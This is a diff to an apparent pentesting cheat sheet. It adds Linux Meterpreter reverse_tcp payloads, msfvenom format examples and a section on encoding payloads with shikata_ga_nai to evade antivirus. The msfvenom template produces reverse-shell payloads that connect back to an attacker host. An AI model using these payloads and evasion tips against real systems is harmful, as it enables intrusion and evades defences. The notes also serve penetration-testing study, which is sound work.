@@ -474,6 +474,9 @@ windows/x64/meterpreter/reverse_tcp
 
 windows/meterpreter/bind_tcp
 windows/x64/meterpreter/bind_tcp
+
+linux/x86/meterpreter/reverse_tcp
+linux/x64/meterpreter/reverse_tcp
 ```
 ```
 use multi/handler
@@ -492,10 +495,20 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <f
 ```
 - `<architecture>`: `x86`, `x64`
 - `<payload>`: Pick your poison from `msfvenom --list payloads`
-- `<format>`: Pick your poison from `msfvenom --list formats`
+- `<format>`: Pick your poison from `msfvenom --list formats` e.g. `elf`, `exe`, `aspx`.
 
 #### Encoding Payloads
+- Not effective against modern AVs.
 
+```
+msfvenom --list encoders
+```
+- `x86/shikata_ga_nai` is the best encoder option.
+
+```
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f <format> > <filename>
+```
+- Having more iterations increases the chances of evading AVs.
 
 ## ProFTPD 1.3.3c
 ```
